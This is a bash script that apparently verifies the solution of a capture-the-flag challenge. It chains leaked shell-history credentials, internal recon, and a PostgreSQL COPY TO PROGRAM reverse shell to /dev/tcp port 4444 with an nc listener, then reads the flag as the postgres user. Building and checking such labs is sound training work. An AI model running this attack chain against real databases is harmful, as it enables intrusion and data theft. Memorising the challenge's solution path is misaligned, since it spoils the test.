#!/usr/bin/env bash
# Automated solver for `escape` — follows the intended attack path:
#
#   ssh (player) -> capsh decoy -> .bash_history leak -> nmap recon
#   -> psql (appuser / devpass123) -> maintenance_notes -> decode b64
#   -> COPY ... TO PROGRAM reverse shell (as OS postgres) -> find + cat flag
#
# Usage:  CONTAINER=<entry container> solution/verify_solution.sh
#
# The script never reads the flag directly from the image or the host; every
# reveal happens through a shell owned by the pwned postgres user.
set -euo pipefail

CONTAINER="${CONTAINER:-}"

die() { printf 'FAIL: %s\n' "$1" >&2; exit 1; }
ok()  { printf '[%d] %s\n' "$1" "$2"; }
[ -n "$CONTAINER" ] || die "CONTAINER=<entry container name> required"

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
EXPECTED="$(sed -n 's/^flag:[[:space:]]*//p' "$ROOT/chall.yaml" | head -1)"

ap() { docker exec -u player "$CONTAINER" bash -c "$1"; }   # as player
ar() { docker exec "$CONTAINER" bash -c "$1"; }             # as root (infra only)

echo "=== escape — automated solver ($(docker exec "$CONTAINER" hostname)) ==="

# 1. the decoy: NET_ADMIN in the bounding set, and nothing on the box to use it with.
ap 'capsh --print' | grep -q 'cap_net_admin' \
  || die "cap_net_admin not in the bounding set"
ok 1 "cap_net_admin present in the bounding set (the decoy)"

# 2. the leak in .bash_history: creds, but the host is masked out.
ap "grep -o 'psql -h.*' ~/.bash_history" | grep -q 'devpass123' \
  || die "no devpass123 leak in .bash_history"
ok 2 ".bash_history leaks appuser/devpass123 with a masked host"

# 3. recon: find the database on the internal subnet.
DBIP="$(ap 'getent hosts db | awk "{print \$1}"' | head -1)"
[ -n "$DBIP" ] || die "database 'db' not resolvable from the entry host"
ok 3 "database found at $DBIP:5432 on the internal network"

# 4. psql: tables + the bait note.
NOTE="$(docker exec -u player -e PGPASSWORD=devpass123 "$CONTAINER" \
        psql -h "$DBIP" -U appuser -d appdb -qAt -c \
        "SELECT note FROM maintenance_notes LIMIT 1")" \
  || die "psql failed"
printf '%s' "$NOTE" | grep -q 'COPY TO PROGRAM' || die "no bait note"
ok 4 "connected as appuser; maintenance_notes has the bait"

B64="$(printf '%s' "$NOTE" | grep -oE '\[[A-Za-z0-9+/=]+\]' | tr -d '[]' | head -1)"
[ -n "$B64" ] || die "no base64 payload in the note"
PAYLOAD="$(docker exec "$CONTAINER" bash -c "printf '%s' '$B64' | base64 -d")"
# The payload must point the reverse shell back at the *entry* host (where the
# player will listen), not at the db.
LISTEN="$(printf '%s' "$PAYLOAD" | grep -oE '/dev/tcp/[0-9.]+/4444' | cut -d/ -f4)"
ENTRY_IP="$(ap 'getent hosts entry | awk "{print \$1}"' | head -1)"
[ "$LISTEN" = "$ENTRY_IP" ] \
  || die "payload targets the wrong listener ($LISTEN, want $ENTRY_IP): $PAYLOAD"
ok 5 "decoded COPY TO PROGRAM payload (listener = $ENTRY_IP:4444)"

# 6. listener + reverse shell; transcript proves who we are and what we have.
ar "rm -f /tmp/escape_solve.log; ( echo id; echo hostname; \
      echo 'find / -name flag.txt 2>/dev/null'; \
      echo 'cat /usr/local/.sys_cache_7f3a2b/flag.txt' ) \
    | timeout 20 nc -lvnp 4444 > /tmp/escape_solve.log 2>&1 &"
sleep 1
docker exec -u player -e PGPASSWORD=devpass123 "$CONTAINER" \
  psql -h "$DBIP" -U appuser -d appdb -qAt \
  -c "COPY (SELECT 1) TO PROGRAM '$PAYLOAD'" >/dev/null 2>&1 \
  || die "COPY TO PROGRAM refused"
sleep 5
LOG="$(ar 'cat /tmp/escape_solve.log')"

printf '%s' "$LOG" | grep -qE 'uid=[0-9]+\(postgres\)' \
  || die "reverse shell did not run as the postgres OS user:\n$LOG"
ok 6 "shell on the db host as the postgres OS user via the reverse shell"

printf '%s' "$LOG" | grep -q '/usr/local/.sys_cache_7f3a2b/flag.txt' \
  || die "find did not locate the flag file:\n$LOG"
ok 7 "find locates /usr/local/.sys_cache_7f3a2b/flag.txt"

GOT="$(printf '%s' "$LOG" | grep -o 'ingehack{[^}]*}' | tail -1)"
[ "$GOT" = "$EXPECTED" ] \
  || die "flag '$GOT' != manifest flag '$EXPECTED'\n$LOG"
ok 8 "read the flag as postgres (COPY TO PROGRAM RCE)"

echo
echo "FLAG: $GOT"
echo "RESULT: PASS"
